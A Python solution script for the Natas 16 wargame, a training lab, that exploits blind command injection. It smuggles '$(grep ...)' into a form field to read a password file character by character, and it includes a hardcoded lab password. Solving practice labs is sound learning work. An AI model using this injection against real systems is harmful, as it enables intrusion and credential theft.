#!/usr/bin/env python3
# .*. coding: utf-8 -*-

import requests
import re 
import string 


usn = 'natas16'
pw = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
alphanum = string.ascii_letters + string.digits
##Source code - uncomment this to get the CTF source code
#url = 'http://%s.natas.labs.overthewire.org/index-source.html' % 

url = 'http://%s.natas.labs.overthewire.org/' % usn
session = requests.Session()
confirmed_pass = list()

while(len(confirmed_pass) < 32):
  for ch in alphanum:
   
    response = session.post(url, data = { "needle" : "sampler$(grep ^" + "".join(confirmed_pass) + ch  + " /etc/natas_webpass/natas17)" },auth = (usn, pw) )
    content = response.text

    returned = re.findall( '<pre>\n(.*)\n</pre>', content )
    
    if(not returned):
      confirmed_pass.append(ch)
      print("".join(confirmed_pass))
      break		

# Note: .join will iterate each character in the string - must be empty
# to keep it formatted correctly
print("".join(confirmed_pass))

